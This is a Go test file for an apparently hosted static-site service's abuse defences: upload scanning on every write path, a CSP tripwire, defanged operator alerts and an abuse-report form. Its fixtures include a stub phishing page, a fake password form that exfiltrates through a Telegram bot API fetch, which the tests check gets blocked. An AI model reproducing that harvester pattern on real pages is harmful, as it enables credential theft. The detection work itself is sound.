package httpapi

import (
	"archive/zip"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"net/textproto"
	"net/url"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/ittrail/sitebin.io/internal/abuse"
	"github.com/ittrail/sitebin.io/internal/ext"
	"github.com/ittrail/sitebin.io/internal/forms"
	"github.com/ittrail/sitebin.io/internal/store"
)

// kitHTML is enough of the 2026-09-25 Telegram harvester to block.
const kitHTML = `<html><head><title>Account Verification</title></head><body>
<form id="verifyForm"><input type="password" id="password"></form>
<script>fetch("https://api.telegram.org/bot8874059130:AAG/sendMessage")</script></body></html>`

// abuseEnv is a hosted instance: accounts on, sites owned by acct-1 on an
// untrusted tier (as drop and free are), account token sbp_tok, forms mailer
// and alerts on with a recording sender.
func abuseEnv(t *testing.T, trusted bool) (*env, *fakeProvider, *recSender) {
	t.Helper()
	e := newEnv(t, map[string]string{
		"SITEBIN_FORMS_SMTP_HOST": "smtp.test", "SITEBIN_FORMS_SMTP_FROM": "noreply@sitebin.example",
		"SITEBIN_ABUSE_ALERTS_TO": "office@operator.example",
	})
	fp := &fakeProvider{enabled: true, owner: "acct-1", bearer: map[string]string{"sbp_tok": "acct-1"},
		grant: ext.CreateGrant{Trusted: trusted, MaxExpiryDays: 7}}
	ext.Register(fp)
	t.Cleanup(ext.Reset)
	rs := &recSender{}
	e.api.alerts.send = rs
	return e, fp, rs
}

// cleanSite creates an owned, harmless site through the API with the token.
func cleanSite(t *testing.T, e *env, fields map[string]string) (viewID, editID, pw string) {
	t.Helper()
	body, ct := filesBody(t, fields, map[string]string{"index.html": "<p>hello</p>"}, nil)
	req := httptest.NewRequest("POST", "/api/sites", body)
	req.Header.Set("Content-Type", ct)
	bearer(req, "sbp_tok")
	w := e.public(t, req)
	if w.Code != 201 {
		t.Fatalf("create: %d %s", w.Code, w.Body)
	}
	var c createResp
	json.Unmarshal(w.Body.Bytes(), &c)
	return c.ID, editIDFrom(t, c.EditURL), c.EditPassword
}

// filesBody builds a multipart body of files and, optionally, a zip part.
func filesBody(t *testing.T, fields, files, zipped map[string]string) (io.Reader, string) {
	t.Helper()
	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	for k, v := range fields {
		mw.WriteField(k, v)
	}
	for name, content := range files {
		h := textproto.MIMEHeader{}
		h.Set("Content-Disposition", fmt.Sprintf(`form-data; name="files"; filename="%s"`, name))
		p, _ := mw.CreatePart(h)
		p.Write([]byte(content))
	}
	if zipped != nil {
		h := textproto.MIMEHeader{}
		h.Set("Content-Disposition", `form-data; name="zip"; filename="site.zip"`)
		p, _ := mw.CreatePart(h)
		zw := zip.NewWriter(p)
		for name, content := range zipped {
			f, _ := zw.Create(name)
			f.Write([]byte(content))
		}
		zw.Close()
	}
	mw.Close()
	return &buf, mw.FormDataContentType()
}

// heldSite asserts that the site was held by the scanner with the kit kept.
func heldSite(t *testing.T, e *env, viewID, path string) {
	t.Helper()
	site, err := e.st.ByViewID(viewID)
	if err != nil {
		t.Fatalf("the held site must be kept: %v", err)
	}
	if site.Meta.Locked == nil || site.Meta.Locked.By != store.LockByScanner {
		t.Fatalf("site %s not held: lock %+v", viewID, site.Meta.Locked)
	}
	if _, err := os.Stat(site.ContentDir() + "/" + path); err != nil {
		t.Errorf("the kit %s is not kept as evidence: %v", path, err)
	}
	if site.Meta.Abuse == nil || len(site.Meta.Abuse.Findings) == 0 {
		t.Error("no findings recorded")
	}
}

// createdID is the view id of the last site the fake extension was told
// about ("acct-1:<id>").
func createdID(t *testing.T, fp *fakeProvider) string {
	t.Helper()
	if len(fp.created) == 0 {
		t.Fatal("no site was recorded as created")
	}
	_, id, _ := strings.Cut(fp.created[len(fp.created)-1], ":")
	return id
}

// Every surface a file can arrive through: each must end with the site held
// and the caller told why. A new write surface belongs in this table (and
// the census test below fails until its writes go through the guard).
func TestEveryWriteSurfaceIsScanned(t *testing.T) {
	type surface struct {
		name string
		// write puts the kit at index.html (or kit.html) and returns the view
		// id and whatever the caller was answered.
		write func(t *testing.T, e *env, fp *fakeProvider) (viewID string, code int, msg string)
		path  string
	}
	apiUpload := func(query string, files, zipped map[string]string) func(*testing.T, *env, *fakeProvider) (string, int, string) {
		return func(t *testing.T, e *env, fp *fakeProvider) (string, int, string) {
			id, edit, _ := cleanSite(t, e, nil)
			body, ct := filesBody(t, nil, files, zipped)
			req := httptest.NewRequest("POST", "/api/sites/"+edit+"/files"+query, body)
			req.Header.Set("Content-Type", ct)
			w := e.public(t, bearer(req, "sbp_tok"))
			return id, w.Code, w.Body.String()
		}
	}
	mcpWrite := func(replace bool) func(*testing.T, *env, *fakeProvider) (string, int, string) {
		return func(t *testing.T, e *env, fp *fakeProvider) (string, int, string) {
			id, edit, _ := cleanSite(t, e, nil)
			cs := mcpClient(t, e, http.Header{"Authorization": {"Bearer sbp_tok"}})
			res := mcpCall(t, cs, "write_files", map[string]any{"edit_id": edit, "replace": replace,
				"files": []any{map[string]any{"path": "index.html", "text": kitHTML}}})
			code := 200
			if res.IsError {
				code = 403
			}
			return id, code, mcpText(res)
		}
	}
	dav := func(t *testing.T, e *env, method, target string, body io.Reader, hdr map[string]string) (string, int, string) {
		id, edit, pw := cleanSite(t, e, map[string]string{"webdav": "true"})
		if hdr["prep"] != "" {
			e.st.SetScanner(nil) // content from before the scanner
			site, _ := e.st.ByViewID(id)
			e.st.SaveFile(site, hdr["prep"], strings.NewReader(kitHTML))
			e.st.SetScanner(abuse.NewLoader(""))
		}
		req := httptest.NewRequest(method, "/dav/"+edit+"/"+target, body)
		req.SetBasicAuth("u", pw)
		if d := hdr["Destination"]; d != "" {
			req.Header.Set("Destination", "http://sitebin.example/dav/"+edit+"/"+d)
		}
		w := e.public(t, req)
		return id, w.Code, w.Body.String()
	}
	surfaces := []surface{
		{"api create", func(t *testing.T, e *env, fp *fakeProvider) (string, int, string) {
			body, ct := filesBody(t, nil, map[string]string{"index.html": kitHTML}, nil)
			req := httptest.NewRequest("POST", "/api/sites", body)
			req.Header.Set("Content-Type", ct)
			w := e.public(t, bearer(req, "sbp_tok"))
			return createdID(t, fp), w.Code, w.Body.String()
		}, "index.html"},
		{"api create zip", func(t *testing.T, e *env, fp *fakeProvider) (string, int, string) {
			body, ct := filesBody(t, nil, nil, map[string]string{"index.html": kitHTML})
			req := httptest.NewRequest("POST", "/api/sites", body)
			req.Header.Set("Content-Type", ct)
			w := e.public(t, bearer(req, "sbp_tok"))
			return createdID(t, fp), w.Code, w.Body.String()
		}, "index.html"},
		{"api upload", apiUpload("", map[string]string{"index.html": kitHTML}, nil), "index.html"},
		{"api upload zip", apiUpload("", nil, map[string]string{"index.html": kitHTML}), "index.html"},
		{"api replace", apiUpload("?replace=true", map[string]string{"index.html": kitHTML}, nil), "index.html"},
		{"api replace zip", apiUpload("?replace=true", nil, map[string]string{"index.html": kitHTML}), "index.html"},
		{"upload token", func(t *testing.T, e *env, fp *fakeProvider) (string, int, string) {
			id, edit, _ := cleanSite(t, e, nil)
			tok, _, _ := e.api.uploads.issue(id, edit)
			body, ct := filesBody(t, nil, map[string]string{"index.html": kitHTML}, nil)
			req := httptest.NewRequest("POST", "/api/sites/"+edit+"/files", body)
			req.Header.Set("Content-Type", ct)
			w := e.public(t, bearer(req, tok))
			return id, w.Code, w.Body.String()
		}, "index.html"},
		{"upload token webdav", func(t *testing.T, e *env, fp *fakeProvider) (string, int, string) {
			id, edit, _ := cleanSite(t, e, nil)
			tok, _, _ := e.api.uploads.issue(id, edit)
			req := httptest.NewRequest("PUT", "/dav/"+edit+"/index.html", strings.NewReader(kitHTML))
			w := e.public(t, bearer(req, tok))
			return id, w.Code, w.Body.String()
		}, "index.html"},
		{"mcp create_site", func(t *testing.T, e *env, fp *fakeProvider) (string, int, string) {
			cs := mcpClient(t, e, http.Header{"Authorization": {"Bearer sbp_tok"}})
			res := mcpCall(t, cs, "create_site", map[string]any{"files": []any{map[string]any{"path": "index.html", "text": kitHTML}}})
			code := 201
			if res.IsError {
				code = 403
			}
			return createdID(t, fp), code, mcpText(res)
		}, "index.html"},
		{"mcp write_files", mcpWrite(false), "index.html"},
		{"mcp write_files replace", mcpWrite(true), "index.html"},
		{"webdav put", func(t *testing.T, e *env, fp *fakeProvider) (string, int, string) {
			return dav(t, e, "PUT", "index.html", strings.NewReader(kitHTML), nil)
		}, "index.html"},
		{"webdav copy", func(t *testing.T, e *env, fp *fakeProvider) (string, int, string) {
			return dav(t, e, "COPY", "kit.txt", nil, map[string]string{"prep": "kit.txt", "Destination": "kit.html"})
		}, "kit.html"},
		{"webdav move", func(t *testing.T, e *env, fp *fakeProvider) (string, int, string) {
			return dav(t, e, "MOVE", "kit.txt", nil, map[string]string{"prep": "kit.txt", "Destination": "kit.html"})
		}, "kit.html"},
		{"ftp", func(t *testing.T, e *env, fp *fakeProvider) (string, int, string) {
			id, edit, pw := cleanSite(t, e, map[string]string{"ftp": "true"})
			sess, err := e.api.FTPAuth(edit, pw, "1.2.3.4")
			if err != nil || sess.Guard == nil {
				t.Fatalf("FTPAuth: %v (guard %v)", err, sess.Guard)
			}
			f, err := sess.Guard.Stage("index.html", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0o644)
			if err != nil {
				t.Fatal(err)
			}
			f.Write([]byte(kitHTML))
			if err := f.Close(); err != nil {
				return id, 403, err.Error()
			}
			return id, 226, ""
		}, "index.html"},
		{"ftp rename", func(t *testing.T, e *env, fp *fakeProvider) (string, int, string) {
			id, edit, pw := cleanSite(t, e, map[string]string{"ftp": "true"})
			e.st.SetScanner(nil)
			site, _ := e.st.ByViewID(id)
			e.st.SaveFile(site, "kit.txt", strings.NewReader(kitHTML))
			e.st.SetScanner(abuse.NewLoader(""))
			sess, _ := e.api.FTPAuth(edit, pw, "1.2.3.4")
			if err := sess.Guard.Rename("kit.txt", "kit.html"); err != nil {
				return id, 403, err.Error()
			}
			return id, 250, ""
		}, "kit.html"},
	}
	for _, s := range surfaces {
		t.Run(s.name, func(t *testing.T) {
			e, fp, _ := abuseEnv(t, false)
			e.cfg.FTPEnabled = true
			e.api.cfg.FTPEnabled = true
			id, code, msg := s.write(t, e, fp)
			if code != 403 {
				t.Errorf("caller answered %d %s, want 403", code, msg)
			}
			if !strings.Contains(msg, "held for review") {
				t.Errorf("the caller is not told why: %q", msg)
			}
			heldSite(t, e, id, s.path)
			// and it is served to nobody
			req := httptest.NewRequest("GET", "/internal/authz", nil)
			req.Host = id + ".sitebin.example"
			if w := e.internal(t, req); w.Code != 410 {
				t.Errorf("authz = %d, want 410", w.Code)
			}
		})
	}
}

// A held creation still finishes its bookkeeping: the plan's lifetime, the
// owner's record.
func TestHeldCreationKeepsItsLifetimeAndOwner(t *testing.T) {
	e, fp, _ := abuseEnv(t, false)
	body, ct := filesBody(t, nil, map[string]string{"index.html": kitHTML}, nil)
	req := httptest.NewRequest("POST", "/api/sites", body)
	req.Header.Set("Content-Type", ct)
	w := e.public(t, bearer(req, "sbp_tok"))
	if w.Code != 403 || strings.Contains(w.Body.String(), "edit_password") {
		t.Fatalf("create = %d %s", w.Code, w.Body)
	}
	site, _ := e.st.ByViewID(createdID(t, fp))
	if site.Meta.OwnerAccountID != "acct-1" || site.Meta.ExpiresAt == nil || !site.Meta.ExpiryFromTier {
		t.Errorf("owner %q expiry %v fromTier %v", site.Meta.OwnerAccountID, site.Meta.ExpiresAt, site.Meta.ExpiryFromTier)
	}
}

func TestTrustedTierIsFlaggedNotHeld(t *testing.T) {
	e, _, rs := abuseEnv(t, true)
	id, edit, _ := cleanSite(t, e, nil)
	body, ct := filesBody(t, nil, map[string]string{"index.html": kitHTML}, nil)
	req := httptest.NewRequest("POST", "/api/sites/"+edit+"/files", body)
	req.Header.Set("Content-Type", ct)
	if w := e.public(t, bearer(req, "sbp_tok")); w.Code != 200 {
		t.Fatalf("upload on a trusted tier = %d %s", w.Code, w.Body)
	}
	site, _ := e.st.ByViewID(id)
	if site.Meta.Locked != nil || site.Meta.Abuse == nil {
		t.Fatalf("lock %+v abuse %+v", site.Meta.Locked, site.Meta.Abuse)
	}
	e.api.alerts.wg.Wait()
	m := rs.last(t)
	if txt := mailText(t, m); !strings.Contains(txt, store.DecisionTrusted) {
		t.Errorf("alert does not say why it was not held:\n%s", txt)
	}
}

func TestOperatorSitesAreNeverHeld(t *testing.T) {
	e, _, _ := abuseEnv(t, false)
	e.st.SetOperatorCheck(func(owner string) bool { return owner == "acct-1" })
	id, edit, _ := cleanSite(t, e, nil)
	body, ct := filesBody(t, nil, map[string]string{"index.html": kitHTML}, nil)
	req := httptest.NewRequest("POST", "/api/sites/"+edit+"/files", body)
	req.Header.Set("Content-Type", ct)
	if w := e.public(t, bearer(req, "sbp_tok")); w.Code != 200 {
		t.Fatalf("upload = %d %s", w.Code, w.Body)
	}
	if site, _ := e.st.ByViewID(id); site.Meta.Locked != nil {
		t.Fatal("the operator's site was held")
	}
}

// The community build has no tiers and marks every site trusted: the
// scanner records and alerts, it never locks.
func TestCommunityBuildFlagsOnly(t *testing.T) {
	e := newEnv(t, map[string]string{
		"SITEBIN_FORMS_SMTP_HOST": "smtp.test", "SITEBIN_FORMS_SMTP_FROM": "noreply@sitebin.example",
		"SITEBIN_ABUSE_ALERTS_TO": "office@operator.example",
	})
	rs := &recSender{}
	e.api.alerts.send = rs
	c := e.createSite(t, nil, map[string]string{"index.html": kitHTML})
	site, _ := e.st.ByViewID(c.ID)
	if site.Meta.Locked != nil || site.Meta.Abuse == nil || len(site.Meta.Abuse.Findings) == 0 {
		t.Fatalf("lock %+v abuse %+v", site.Meta.Locked, site.Meta.Abuse)
	}
	e.api.alerts.wg.Wait()
	txt := mailText(t, rs.last(t))
	if strings.Contains(txt, "/account/admin") || !strings.Contains(txt, "sitebin lock "+c.ID) {
		t.Errorf("a community alert points at the CLI, not a register:\n%s", txt)
	}
}

func TestHeldAlertIsPlainTextDefangedAndLinksTheRegister(t *testing.T) {
	e, fp, rs := abuseEnv(t, false)
	body, ct := filesBody(t, nil, map[string]string{"index.html": kitHTML}, nil)
	req := httptest.NewRequest("POST", "/api/sites", body)
	req.Header.Set("Content-Type", ct)
	e.public(t, bearer(req, "sbp_tok"))
	id := createdID(t, fp)
	e.api.alerts.wg.Wait()
	m := rs.last(t)
	if m.To != "office@operator.example" {
		t.Errorf("to %q", m.To)
	}
	raw := string(m.Data)
	if strings.Contains(strings.ToLower(raw), "text/html") {
		t.Fatal("an alert must be plain text")
	}
	if !strings.Contains(raw, "Subject: [sitebin abuse] Site held: "+id) {
		t.Errorf("subject:\n%s", raw[:400])
	}
	txt := mailText(t, m)
	for _, want := range []string{"telegram-bot-api", "index.html", "hxxps://api[.]telegram[.]org/bot", "http://sitebin.example/account/admin?q=" + id, "LOCKED by scanner", "acct-1"} {
		if !strings.Contains(txt, want) {
			t.Errorf("alert lacks %q:\n%s", want, txt)
		}
	}
	if strings.Contains(txt, "https://api.telegram.org") {
		t.Error("a live kit URL in the alert")
	}
}

func TestAlertsAreAggregated(t *testing.T) {
	e, _, rs := abuseEnv(t, true)
	al := e.api.alerts
	var digest func()
	al.after = func(_ time.Duration, f func()) { digest = f }
	for i := 0; i < 3; i++ {
		al.notify(alertEvent{key: "site-a", subject: "a", body: "b", line: fmt.Sprintf("site-a event %d", i)})
	}
	for i := 0; i < 15; i++ {
		al.notify(alertEvent{key: fmt.Sprintf("site-%d", i), subject: "s", body: "b", line: fmt.Sprintf("site-%d", i)})
	}
	al.wg.Wait()
	rs.mu.Lock()
	immediate := len(rs.sent)
	rs.mu.Unlock()
	if immediate != alertBurst {
		t.Fatalf("%d immediate mails, want %d (one for site-a, then the cap)", immediate, alertBurst)
	}
	if digest == nil {
		t.Fatal("no digest was scheduled")
	}
	digest()
	al.wg.Wait()
	m := rs.last(t)
	txt := mailText(t, m)
	if !strings.Contains(string(m.Data), "Digest: 8 event(s)") || !strings.Contains(txt, "site-a event 1") || !strings.Contains(txt, "site-14") {
		t.Errorf("digest:\n%s\n%s", m.Data[:300], txt)
	}
	// an hour later a site gets its own mail again
	al.now = func() time.Time { return time.Now().Add(2 * time.Hour) }
	al.notify(alertEvent{key: "site-a", subject: "again", body: "b"})
	al.wg.Wait()
	if !strings.Contains(string(rs.last(t).Data), "again") {
		t.Error("the per-site window never reopened")
	}
}

func TestAlertsWithoutAMailerAreLogged(t *testing.T) {
	e := newEnv(t, map[string]string{"SITEBIN_ABUSE_ALERTS_TO": "office@operator.example"})
	if e.api.alerts.send != nil {
		t.Fatal("no forms mailer means no sender")
	}
	e.api.alerts.notify(alertEvent{key: "k", subject: "s", body: "b"}) // must not panic
}

func TestDefang(t *testing.T) {
	for in, want := range map[string]string{
		"https://api.telegram.org/bot1/send": "hxxps://api[.]telegram[.]org/bot1/send",
		"see x.y.sitebin.app now":            "see x[.]y[.]sitebin[.]app now",
		"no dots here. Really.":              "no dots here. Really.",
	} {
		if got := defang(in); got != want {
			t.Errorf("defang(%q) = %q, want %q", in, got, want)
		}
	}
}

// ---- the CSP tripwire ----

// cspReport posts one report as a browser on site id would.
func cspReportFor(t *testing.T, e *env, host, blocked, doc string) {
	t.Helper()
	body := fmt.Sprintf(`{"csp-report":{"blocked-uri":%q,"document-uri":%q}}`, blocked, doc)
	req := httptest.NewRequest("POST", "/_sitebin/csp-report", strings.NewReader(body))
	req.Host = host
	if w := e.public(t, req); w.Code != http.StatusNoContent {
		t.Fatalf("csp report = %d", w.Code)
	}
}

// preloaded puts content on a site as if it predated the scanner.
func preloaded(t *testing.T, e *env, viewID string, files map[string]string) {
	t.Helper()
	site, _ := e.st.ByViewID(viewID)
	e.st.SetScanner(nil)
	for p, c := range files {
		e.st.SaveFile(site, p, strings.NewReader(c))
	}
	e.st.SetScanner(abuse.NewLoader(""))
}

func TestTripwireLocksAVerifiedExfiltration(t *testing.T) {
	e, _, rs := abuseEnv(t, false)
	id, _, _ := cleanSite(t, e, nil)
	preloaded(t, e, id, map[string]string{"bug.html": kitHTML})
	host := id + ".sitebin.example"
	cspReportFor(t, e, host, "https://api.telegram.org/bot8874059130:AAG/sendMessage", "http://"+host+"/bug.html")
	site, _ := e.st.ByViewID(id)
	if site.Meta.Locked == nil || site.Meta.Locked.By != store.LockByScanner || !strings.Contains(site.Meta.Locked.Reason, "api.telegram.org") {
		t.Fatalf("lock %+v", site.Meta.Locked)
	}
	e.api.alerts.wg.Wait()
	if m := rs.last(t); !strings.Contains(string(m.Data), "held by the CSP tripwire") {
		t.Errorf("alert %s", m.Data[:300])
	}
	// the report is still counted as before
	e.api.csp.now = func() time.Time { return time.Now().Add(2 * time.Hour) }
	cspReportFor(t, e, host, "https://api.telegram.org/bot1", "")
	if st := e.st.Stats(site); st.CSPViolations == 0 {
		t.Error("the report was not counted")
	}
}

// A report is unauthenticated: anyone can send one naming any site. It
// locks nothing unless the site's own files reference the destination.
func TestTripwireIgnoresAForgedReport(t *testing.T) {
	e, _, rs := abuseEnv(t, false)
	id, _, _ := cleanSite(t, e, nil)
	host := id + ".sitebin.example"
	cspReportFor(t, e, host, "https://api.telegram.org/bot1/sendMessage", "http://"+host+"/")
	site, _ := e.st.ByViewID(id)
	if site.Meta.Locked != nil || site.Meta.Abuse != nil {
		t.Fatalf("a forged report acted: %+v %+v", site.Meta.Locked, site.Meta.Abuse)
	}
	e.api.alerts.wg.Wait()
	if m := rs.last(t); !strings.Contains(string(m.Data), "not verified") {
		t.Errorf("alert %s", m.Data[:300])
	}
}

func TestTripwireIgnoresAnotherSitesDocument(t *testing.T) {
	e, _, _ := abuseEnv(t, false)
	id, _, _ := cleanSite(t, e, nil)
	other, _, _ := cleanSite(t, e, nil)
	preloaded(t, e, id, map[string]string{"bug.html": kitHTML})
	cspReportFor(t, e, id+".sitebin.example", "https://api.telegram.org/bot1", "http://"+other+".sitebin.example/")
	if site, _ := e.st.ByViewID(id); site.Meta.Locked != nil {
		t.Fatal("a report whose page is another site's locked this one")
	}
}

func TestTripwireOnATrustedSiteAlertsOnly(t *testing.T) {
	e, _, _ := abuseEnv(t, true)
	id, _, _ := cleanSite(t, e, nil)
	preloaded(t, e, id, map[string]string{"bot.js": `fetch("https://api.telegram.org/bot"+t)`})
	cspReportFor(t, e, id+".sitebin.example", "https://api.telegram.org/bot1", "")
	site, _ := e.st.ByViewID(id)
	if site.Meta.Locked != nil || site.Meta.Abuse == nil {
		t.Fatalf("trusted: lock %+v abuse %+v", site.Meta.Locked, site.Meta.Abuse)
	}
}

func TestTripwireIgnoresOtherDestinations(t *testing.T) {
	e, _, rs := abuseEnv(t, false)
	id, _, _ := cleanSite(t, e, nil)
	cspReportFor(t, e, id+".sitebin.example", "https://cdn.example.com/lib.js", "")
	e.api.alerts.wg.Wait()
	rs.mu.Lock()
	n := len(rs.sent)
	rs.mu.Unlock()
	if n != 0 {
		t.Error("an ordinary blocked request alerted")
	}
}

// ---- reports ----

func TestReportPageRendersWithoutScript(t *testing.T) {
	e := newEnv(t, nil)
	w := e.public(t, httptest.NewRequest("GET", "/report?url=https://abc.sitebin.example/x", nil))
	if w.Code != 200 {
		t.Fatalf("GET /report = %d", w.Code)
	}
	csp := w.Header().Get("Content-Security-Policy")
	if !strings.Contains(csp, "default-src 'none'") || strings.Contains(csp, "script-src") {
		t.Errorf("CSP %q", csp)
	}
	body := w.Body.String()
	for _, want := range []string{`<form method="post" action="/report">`, `name="_gotcha"`, `name="t"`, `value="https://abc.sitebin.example/x"`, `value="phishing"`} {
		if !strings.Contains(body, want) {
			t.Errorf("page lacks %s", want)
		}
	}
	if strings.Contains(body, "<script") {
		t.Error("the report page has a script")
	}
	// only on the base domain
	req := httptest.NewRequest("GET", "/report", nil)
	req.Host = "abc.sitebin.example"
	if w := e.public(t, req); w.Code != 404 {
		t.Errorf("report page on a site host = %d", w.Code)
	}
}

func postReport(t *testing.T, e *env, form url.Values) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest("POST", "/report", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.RemoteAddr = "198.51.100.7:1234"
	return e.public(t, req)
}

func TestReportPageStoresAndMails(t *testing.T) {
	e, _, rs := abuseEnv(t, false)
	id, _, _ := cleanSite(t, e, nil)
	form := url.Values{
		"t": {e.api.ticket(time.Now().Add(-10 * time.Second))}, "target": {"https://" + id + ".sitebin.example/login"},
		"reason": {"phishing"}, "details": {"fake bank login, see https://evil.example/x"}, "contact": {"victim@example.org"},
	}
	w := postReport(t, e, form)
	if w.Code != 200 || !strings.Contains(w.Body.String(), "Thank you") {
		t.Fatalf("POST /report = %d %s", w.Code, w.Body)
	}
	reps, _ := e.st.ListReports()
	if len(reps) != 1 {
		t.Fatalf("%d reports stored", len(reps))
	}
	r := reps[0]
	if r.ViewID != id || r.Reason != "Phishing or credential theft" || r.Contact != "victim@example.org" || r.Via != store.ReportViaPage || r.Source != "198.51.100.0/24" {
		t.Errorf("report %+v", r)
	}
	e.api.alerts.wg.Wait()
	m := rs.last(t)
	txt := mailText(t, m)
	for _, want := range []string{"report page", "victim@example.org", "hxxps://evil[.]example/x", "Site:      " + id, "State:     served", "/account/admin?q=" + id, "/account/admin/reports"} {
		if !strings.Contains(txt, want) {
			t.Errorf("report mail lacks %q:\n%s", want, txt)
		}
	}
	if !strings.Contains(string(m.Data), "Subject: [sitebin abuse] Report: Phishing") {
		t.Errorf("subject: %s", m.Data[:300])
	}
}

func TestReportPageSpamProtection(t *testing.T) {
	e := newEnv(t, nil)
	good := func() url.Values {
		return url.Values{"t": {e.api.ticket(time.Now().Add(-10 * time.Second))}, "target": {"https://x.sitebin.example/"}, "reason": {"spam"}}
	}
	// honeypot: thanked, nothing stored
	v := good()
	v.Set("_gotcha", "http://spam.example")
	if w := postReport(t, e, v); w.Code != 200 || !strings.Contains(w.Body.String(), "Thank you") {
		t.Errorf("honeypot = %d", w.Code)
	}
	for name, mutate := range map[string]func(url.Values){
		"too fast": func(v url.Values) { v.Set("t", e.api.ticket(time.Now())) },
		"too old":  func(v url.Values) { v.Set("t", e.api.ticket(time.Now().Add(-3*time.Hour))) },
		"forged": func(v url.Values) {
			v.Set("t", fmt.Sprintf("%d.%s", time.Now().Add(-time.Minute).Unix(), strings.Repeat("0", 32)))
		},
		"no ticket":    func(v url.Values) { v.Del("t") },
		"no reason":    func(v url.Values) { v.Del("reason") },
		"bad reason":   func(v url.Values) { v.Set("reason", "because") },
		"no target":    func(v url.Values) { v.Del("target") },
		"bad contact":  func(v url.Values) { v.Set("contact", "not an address") },
		"long details": func(v url.Values) { v.Set("details", strings.Repeat("x", 5000)) },
	} {
		v := good()
		mutate(v)
		w := postReport(t, e, v)
		if w.Code != 400 {
			t.Errorf("%s: %d", name, w.Code)
		}
		if !strings.Contains(w.Body.String(), `class="err"`) {
			t.Errorf("%s: no error shown", name)
		}
	}
	if reps, _ := e.st.ListReports(); len(reps) != 0 {
		t.Fatalf("%d reports stored by refused submissions", len(reps))
	}
	// the page shares the API's limits: a burst of 5 per source
	codes := []int{}
	for i := 0; i < 7; i++ {
		v := good()
		v.Set("target", fmt.Sprintf("https://x%d.sitebin.example/", i))
		codes = append(codes, postReport(t, e, v).Code)
	}
	if codes[len(codes)-1] != 429 {
		t.Errorf("no rate limit: %v", codes)
	}
}

func TestAPIReportAcceptsAContactAndMails(t *testing.T) {
	e, _, rs := abuseEnv(t, false)
	body := `{"target":"https://nosuch.sitebin.example/","reason":"phishing","contact":"cert@bank.example"}`
	if w := e.public(t, httptest.NewRequest("POST", "/api/report", strings.NewReader(body))); w.Code != 202 {
		t.Fatalf("report = %d %s", w.Code, w.Body)
	}
	reps, _ := e.st.ListReports()
	if len(reps) != 1 || reps[0].Contact != "cert@bank.example" || reps[0].Via != store.ReportViaAPI {
		t.Fatalf("reports %+v", reps)
	}
	e.api.alerts.wg.Wait()
	if txt := mailText(t, rs.last(t)); !strings.Contains(txt, "not resolved to a site") {
		t.Errorf("mail:\n%s", txt)
	}
	bad := `{"target":"x","reason":"y","contact":"nope"}`
	if w := e.public(t, httptest.NewRequest("POST", "/api/report", strings.NewReader(bad))); w.Code != 400 {
		t.Errorf("bad contact = %d", w.Code)
	}
}

func TestReportResolvesPathViews(t *testing.T) {
	e := newEnv(t, nil)
	c := e.createSite(t, nil, map[string]string{"index.html": "x"})
	if s := e.api.resolveTarget("http://sitebin.example/v/" + c.ID + "/page.html"); s == nil || s.ViewID != c.ID {
		t.Errorf("path view not resolved: %v", s)
	}
}

func TestSuspendedPageLinksTheReportPage(t *testing.T) {
	e := newEnv(t, nil)
	c := e.createSite(t, nil, map[string]string{"index.html": "x"})
	site, _ := e.st.ByViewID(c.ID)
	e.st.SetLock(site, &store.SiteLock{By: store.LockByAdmin})
	req := httptest.NewRequest("GET", "/internal/authz", nil)
	req.Host = c.ID + ".sitebin.example"
	w := e.internal(t, req)
	if w.Code != 410 || !strings.Contains(w.Body.String(), `href="http://sitebin.example/report"`) {
		t.Fatalf("suspended page = %d %s", w.Code, w.Body)
	}
}

// ---- the register's seam ----

func TestSiteServiceShowsFindingsAndReports(t *testing.T) {
	e, _, _ := abuseEnv(t, true)
	id, edit, _ := cleanSite(t, e, nil)
	body, ct := filesBody(t, nil, map[string]string{"index.html": kitHTML}, nil)
	req := httptest.NewRequest("POST", "/api/sites/"+edit+"/files", body)
	req.Header.Set("Content-Type", ct)
	e.public(t, bearer(req, "sbp_tok"))
	svc := e.api.SiteService()
	info, _ := svc.Info(id)
	if len(info.Findings) == 0 || info.Findings[0].Path != "index.html" || info.Findings[0].Rule == "" {
		t.Fatalf("findings %+v", info.Findings)
	}
	if err := svc.ClearFindings(id); err != nil {
		t.Fatal(err)
	}
	if info, _ := svc.Info(id); len(info.Findings) != 0 {
		t.Error("findings survive a dismissal")
	}
	e.st.AddReport(store.Report{Target: "t", Reason: "r"})
	reps, err := svc.Reports()
	if err != nil || len(reps) != 1 || reps[0].Via != store.ReportViaAPI {
		t.Errorf("reports %+v %v", reps, err)
	}
}

var _ forms.Sender = (*recSender)(nil)
